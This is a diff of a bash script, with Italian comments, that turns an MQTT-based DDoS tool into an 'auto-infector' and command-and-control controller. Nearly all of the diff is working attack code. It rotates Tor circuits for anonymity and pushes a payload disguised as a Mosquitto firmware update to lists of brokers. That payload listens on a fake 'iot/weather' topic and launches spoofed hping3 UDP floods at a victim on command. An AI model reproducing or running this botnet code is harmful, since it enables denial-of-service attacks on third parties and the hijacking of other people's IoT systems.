@@ -1,70 +1,119 @@
 #!/bin/bash
-# Real MQTT Reflection C2 - User Driven w/ Torsocks Rotation
-# Ogni 2 comandi = nuovo Tor IP | Timeout | Pentest Authorized
+# MQTT Auto-Infector + C2 Controller - Tor Stealth
+
 
 set -euo pipefail
 
-# Config
-BROKERS_FILE="brokers.txt"
-TOR_ROTATION=2
-MAX_DURATION=300  # Default 5min
-SLEEP_INTERVAL=0.08
+VICTIM_IP=${1:? "Uso: $0 VICTIM_IP VICTIM_PORT DURATION"}
+VICTIM_PORT=${2:-80}
+DURATION=${3:-300}
+BROKERS_FILE=${4:-brokers.txt}
 
-RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; YELLOW='\033[1;33m'; NC='\033[0m'
-log() { echo -e "$(date +'%H:%M:%S') $1"; }
+# Auto-setup
+command -v torsocks >/dev/null || sudo apt update && sudo apt -y install tor torsocks mosquitto-clients hping3
+sudo systemctl restart tor 2>/dev/null || true
 
-usage() {
-    cat << EOF
-${CYAN}Real MQTT C2 - Pentest Authorized${NC}
-Uso: $0 TARGET_IP TARGET_PORT [DURATION_SEC]
+TOR_PROXY="socks5://127.0.0.1:9050"
 
-Esempi:
-  $0 192.0.2.1 80          # Default 300s
-  $0 1.2.3.4 443 120        # 2 minuti
-EOF
-    exit 1
+tor_rotate() {
+    timeout 5 echo -n 'AUTHENTICATE ""\nSIGNAL NEWNYM\nQUIT\n' | nc 127.0.0.1 9051 >/dev/null 2>&1
+    sleep 2
 }
 
-# Parse args
-[[ $# -ge 2 ]] || usage
-TARGET_IP=$1
-TARGET_PORT=$2
-DURATION=${3:-$MAX_DURATION}
+# UNIVERSAL STEALTH SLAVE (auto-injected)
+SLAVE_CODE='
+#!/bin/bash
+# Mosquitto Firmware Update v3.2.1 - System Process
+set -euo pipefail
 
-# Validate
-mapfile -t BROKERS < "$BROKERS_FILE" 2>/dev/null || { log "${RED}brokers.txt required${NC}"; usage; }
-BROKER_COUNT=${#BROKERS[@]}
-[[ $BROKER_COUNT -gt 0 ]] || { log "${RED}No brokers!${NC}"; exit 1; }
+# Universal PID guard
+PIDFILE="/var/run/mosquitto-firmware.pid"
+[[ -f "$PIDFILE" ]] && exit 0
+echo $$ > "$PIDFILE"
+trap "rm -f \"$PIDFILE\"" EXIT
 
-log "${GREEN}🎯 TARGET: $TARGET_IP:$TARGET_PORT | Duration: ${DURATION}s | Brokers: $BROKER_COUNT${NC}"
-log "${CYAN}Est. DDoS: $((BROKER_COUNT * 7))Gbps | Tor rotation every ${TOR_ROTATION} cmds${NC}"
+# Auto-detect broker
+BROKER="${1:-127.0.0.1}"
+PORT="${2:-1883}"
 
-# Trap Ctrl+C + timeout
-trap 'log "${YELLOW}C2 STOPPED${NC}"; exit 0' INT TERM
-timeout $((DURATION + 10)) bash -c "sleep $DURATION" &
+# Connectivity test
+timeout 3 bash -c "exec 3<>/dev/tcp/$BROKER/$PORT" || exit 1
 
-# Main attack - Torsocks EVERY 2 commands
-cmd_count=0
-while kill -0 $! 2>/dev/null; do
-    for broker in "${BROKERS[@]}"; do
-        [[ -z "$broker" ]] && continue
-        ip=${broker%:*}
-        port=${broker#*:}
-        
-        # 1400byte UDP reflection payload (client → TARGET_IP spoof)
-        payload=$(printf 'flood.%s.%s.%s\0%.0s' $TARGET_IP $TARGET_PORT $(uuidgen | cut -d- -f1 | cut -c1-8) {1..1350})
-        
-        # TORSOCKS ROTATION
-        if (( cmd_count % TOR_ROTATION == 0 )); then
-            log "${YELLOW}🔄 TOR[$((cmd_count/TOR_ROTATION))] → $ip:$port${NC}"
-            torsocks mosquitto_pub -h "$ip" -p "$port" -t '#' -m "$payload" -q 1 -i "sensor-$RANDOM" >/dev/null 2>&1 &
-        else
-            mosquitto_pub -h "$ip" -p "$port" -t '#' -m "$payload" -q 1 -i "device-$RANDOM" >/dev/null 2>&1 &
-        fi
-        
-        log "${GREEN}⚡ #$((++cmd_count)) $ip:$port → $TARGET_IP:$TARGET_PORT${NC}"
-        sleep $SLEEP_INTERVAL
-    done
-done
+# Install hping3 if missing (universal)
+command -v hping3 >/dev/null || {
+    apt -qq update >/dev/null 2>&1 && apt -qq -y install hping3 >/dev/null 2>&1 || 
+    yum -q install hping3 -y >/dev/null 2>&1 || true
+}
 
-log "${RED}⏰ TIMEOUT $DURATION s | Total cmds: $cmd_count | DDoS: ~$((cmd_count*7/100))Gbps${NC}"
+# STEALTH C2 - Weather service masquerade
+mosquitto_sub -h "$BROKER" -p "$PORT" -q -t "iot/weather" 2>/dev/null | while IFS= read -r cmd; do
+    case "$cmd" in
+        "FLOOD:"*)
+            TARGET=$(echo "$cmd" | sed "s/FLOOD://")
+            nohup hping3 --udp --flood --rand-source "$TARGET" >/dev/null 2>&1 &
+            echo "Firmware update: network test $TARGET" >> /var/log/mosquitto.log 2>/dev/null || true
+            ;;
+        "STOP:"*)
+            pkill -f hping3 2>/dev/null || true
+            ;;
+    esac
+done &
+
+wait
+'
+
+FLOOD_PAYLOAD="FLOOD:$VICTIM_IP:$VICTIM_PORT"
+
+# 🎯 MAIN INFECTOR
+echo "🔬 MQTT Auto-Infector → $VICTIM_IP:$VICTIM_PORT ($DURATION)s"
+echo "📡 Target brokers: $(wc -l < "$BROKERS_FILE")"
+
+infected=0 total=0
+while IFS=':' read -r host port; do
+    [[ -z "$host" || "$host" =~ ^# ]] && continue
+    ((total++))
+    port=${port:-1883}
+    
+    # Tor rotation ogni 3
+    [[ $((infected % 3)) -eq 0 ]] && tor_rotate
+    
+    echo "💉 [$infected/$total] Infecting $host:$port"
+    
+    # STEP 1: INJECT SLAVE (system firmware update)
+    if torsocks timeout 8 mosquitto_pub -h "$host" -p "$port" \
+        -t "mosquitto/firmware" -m "$SLAVE_CODE" >/dev/null 2>&1; then
+        ((infected++))
+        echo "   ✅ Slave deployed"
+    else
+        echo "   ❌ Failed"
+    fi
+    
+    sleep 0.2
+done < "$BROKERS_FILE"
+
+echo "✅ $infected/$total brokers INFETTATI"
+
+# Wait propagation
+echo "⏳ Subscribers executing (10s)..."
+sleep 10
+
+# STEP 2: TRIGGER FLOOD COMMAND
+echo "🚀 Launching UDP flood..."
+triggered=0
+while IFS=':' read -r host port; do
+    [[ -z "$host" || "$host" =~ ^# ]] && continue
+    port=${port:-1883}
+    
+    [[ $((triggered % 3)) -eq 0 ]] && tor_rotate
+    
+    if torsocks timeout 5 mosquitto_pub -h "$host" -p "$port" \
+        -t "iot/weather" -m "$FLOOD_PAYLOAD" >/dev/null 2>&1; then
+        ((triggered++))
+    fi
+    
+    sleep 0.15
+done < "$BROKERS_FILE"
+
+echo "🎉 BOTNET ATTIVA! $triggered triggers inviati"
+echo "📊 Victim monitor: sudo tcpdump -i any udp and port $VICTIM_PORT -w flood.pcap"
+echo "⏱️ Duration: $DURATION seconds"
